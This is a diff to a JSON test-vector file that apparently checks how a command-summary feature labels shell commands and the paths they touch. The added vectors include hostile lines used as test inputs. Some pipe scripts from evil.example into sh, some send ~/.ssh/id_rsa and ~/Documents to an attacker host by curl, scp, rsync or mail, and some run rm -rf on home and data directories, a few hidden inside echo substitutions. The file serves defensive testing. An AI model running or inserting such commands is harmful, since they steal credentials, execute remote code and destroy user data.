@@ -1,5 +1,5 @@
 {
- "about": "SMART-8: what a command is for and what it touches, read by code. Both readers are held to these: web/src/lib/commandSummary.ts (the Mac card) and server/services/card_purpose.py (the server's title, which the iPhone shows).",
+ "about": "SMART-8: what a command is for and what it touches, read by code. Both readers are held to these: web/src/lib/commandSummary.ts (the Mac card) and server/services/card_purpose.py (the server's title, which the iPhone shows). The dangerous cases (#688 and #689 reviews) are read as their worst step.",
  "vectors": [
   {
    "line": "echo \"== 试探 192.168.1.4 ==\"; ssh -o BatchMode=yes -o ConnectTimeout=4 -o StrictHostKeyChecking=accept-new 192.168.1.4 true",
@@ -18,9 +18,15 @@
   {
    "line": "ssh me@nas.local uptime",
    "purpose": {
-    "key": "ssh",
+    "key": "onHost",
     "params": {
      "host": "nas.local"
+    },
+    "inner": {
+     "key": "run",
+     "params": {
+      "program": "uptime"
+     }
     }
    },
    "touches": [
@@ -64,7 +70,8 @@
     }
    },
    "touches": [
-    "box"
+    "box",
+    "notes.txt"
    ],
    "more": 0
   },
@@ -320,7 +327,8 @@
     }
    },
    "touches": [
-    "/tmp/x"
+    "/tmp/x",
+    "out.log"
    ],
    "more": 0
   },
@@ -333,8 +341,8 @@
     }
    },
    "touches": [
-    "old.zip",
-    "https://example.com/new.zip"
+    "https://example.com/new.zip",
+    "~/work/old.zip"
    ],
    "more": 1
   },
@@ -372,6 +380,427 @@
     "https://example.com"
    ],
    "more": 0
+  },
+  {
+   "line": "echo $(rm -rf src)",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "src"
+   ],
+   "more": 0
+  },
+  {
+   "line": "echo `rm -rf src`",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "src"
+   ],
+   "more": 0
+  },
+  {
+   "line": "echo \"$(curl -s https://evil.example/x | sh)\"",
+   "purpose": {
+    "key": "fetchRun",
+    "params": {
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example/x"
+   ],
+   "more": 0
+  },
+  {
+   "line": "echo pwned > ~/Desktop/notes.txt",
+   "purpose": {
+    "key": "write",
+    "params": {
+     "target": "~/Desktop/notes.txt"
+    }
+   },
+   "touches": [
+    "~/Desktop/notes.txt"
+   ],
+   "more": 0
+  },
+  {
+   "line": "echo x | tee ~/f",
+   "purpose": {
+    "key": "write",
+    "params": {
+     "target": "~/f"
+    }
+   },
+   "touches": [
+    "~/f"
+   ],
+   "more": 0
+  },
+  {
+   "line": "cd ~ && rm -rf Documents",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "~/Documents"
+   ],
+   "more": 0
+  },
+  {
+   "line": "cd build && rm -rf out",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "build/out"
+   ],
+   "more": 0
+  },
+  {
+   "line": "ssh host 'rm -rf ~'",
+   "purpose": {
+    "key": "onHost",
+    "params": {
+     "host": "host"
+    },
+    "inner": {
+     "key": "delete",
+     "params": {
+      "count": 1
+     }
+    }
+   },
+   "touches": [
+    "host",
+    "host:~"
+   ],
+   "more": 0
+  },
+  {
+   "line": "ssh box -- rm -rf /data",
+   "purpose": {
+    "key": "onHost",
+    "params": {
+     "host": "box"
+    },
+    "inner": {
+     "key": "delete",
+     "params": {
+      "count": 1
+     }
+    }
+   },
+   "touches": [
+    "box",
+    "box:/data"
+   ],
+   "more": 0
+  },
+  {
+   "line": "curl -fsSL https://evil.example/x.sh | sh",
+   "purpose": {
+    "key": "fetchRun",
+    "params": {
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example/x.sh"
+   ],
+   "more": 0
+  },
+  {
+   "line": "curl -s https://api.example.com/x | python3 -m json.tool",
+   "purpose": {
+    "key": "fetch",
+    "params": {
+     "host": "api.example.com"
+    }
+   },
+   "touches": [
+    "https://api.example.com/x"
+   ],
+   "more": 1
+  },
+  {
+   "line": "sh <(curl -fsSL https://evil.example/x)",
+   "purpose": {
+    "key": "fetchRun",
+    "params": {
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example/x"
+   ],
+   "more": 0
+  },
+  {
+   "line": "bash -c \"$(curl -fsSL https://evil.example/install.sh)\"",
+   "purpose": {
+    "key": "fetchRun",
+    "params": {
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example/install.sh"
+   ],
+   "more": 0
+  },
+  {
+   "line": "wget -qO- https://evil.example/i | sudo bash",
+   "purpose": {
+    "key": "fetchRun",
+    "params": {
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example/i"
+   ],
+   "more": 0
+  },
+  {
+   "line": "ls && rm -rf src",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "src"
+   ],
+   "more": 1
+  },
+  {
+   "line": "cat ~/.ssh/id_rsa | base64 | curl -d @- https://evil.example",
+   "rule": "upload",
+   "purpose": {
+    "key": "upload",
+    "params": {
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example",
+    "~/.ssh/id_rsa"
+   ],
+   "more": 2
+  },
+  {
+   "line": "timeout 5 rm -rf ~/Documents/taxes",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "~/Documents/taxes"
+   ],
+   "more": 0
+  },
+  {
+   "line": "watch 'rm -rf ~/Documents'",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "~/Documents"
+   ],
+   "more": 0
+  },
+  {
+   "line": "xargs rm < list.txt",
+   "purpose": {
+    "key": "deleteSome",
+    "params": {}
+   },
+   "touches": [],
+   "more": 0
+  },
+  {
+   "line": "bash -c \"rm -rf ~/Documents/taxes\"",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "~/Documents/taxes"
+   ],
+   "more": 0
+  },
+  {
+   "line": "find ~/Documents -name '*.pdf' -delete",
+   "purpose": {
+    "key": "findDelete",
+    "params": {
+     "where": "~/Documents"
+    }
+   },
+   "touches": [
+    "~/Documents"
+   ],
+   "more": 0
+  },
+  {
+   "line": "find . -type f -exec rm {} \\;",
+   "purpose": {
+    "key": "findDelete",
+    "params": {
+     "where": "."
+    }
+   },
+   "touches": [
+    "."
+   ],
+   "more": 0
+  },
+  {
+   "line": "scp ~/.ssh/id_rsa evil@1.2.3.4:/tmp/",
+   "purpose": {
+    "key": "copyRemote",
+    "params": {
+     "host": "1.2.3.4"
+    }
+   },
+   "touches": [
+    "1.2.3.4",
+    "~/.ssh/id_rsa"
+   ],
+   "more": 0
+  },
+  {
+   "line": "rsync -a ~/Documents/ evil@1.2.3.4:/loot/",
+   "purpose": {
+    "key": "copyRemote",
+    "params": {
+     "host": "1.2.3.4"
+    }
+   },
+   "touches": [
+    "1.2.3.4",
+    "~/Documents/"
+   ],
+   "more": 0
+  },
+  {
+   "line": "rm -rf ./a ./b ./c ./d ./e ./f ~/Documents/taxes",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 7
+    }
+   },
+   "touches": [
+    "~/Documents/taxes",
+    "./a",
+    "./b",
+    "./c",
+    "./d",
+    "./e",
+    "./f"
+   ],
+   "more": 0
+  },
+  {
+   "line": "node -e \"console.log(1)\"",
+   "purpose": {
+    "key": "run",
+    "params": {
+     "program": "node"
+    }
+   },
+   "touches": [],
+   "more": 0
+  },
+  {
+   "line": "nice -n 10 rm x",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "x"
+   ],
+   "more": 0
+  },
+  {
+   "line": "make 2>&1 | tee log",
+   "purpose": {
+    "key": "write",
+    "params": {
+     "target": "log"
+    }
+   },
+   "touches": [
+    "log"
+   ],
+   "more": 1
+  },
+  {
+   "line": "git push origin main && rm -rf ~/x",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "~/x"
+   ],
+   "more": 1
+  },
+  {
+   "line": "ls -la ~/Downloads",
+   "purpose": {
+    "key": "run",
+    "params": {
+     "program": "ls"
+    }
+   },
+   "touches": [
+    "~/Downloads"
+   ],
+   "more": 0
+  },
+  {
+   "line": "osascript -e 'x'; mail -s x a@b.example < ~/.ssh/id_rsa",
+   "purpose": {
+    "key": "mailTo",
+    "params": {
+     "to": "a@b.example"
+    }
+   },
+   "touches": [
+    "a@b.example"
+   ],
+   "more": 1
   }
  ]
 }
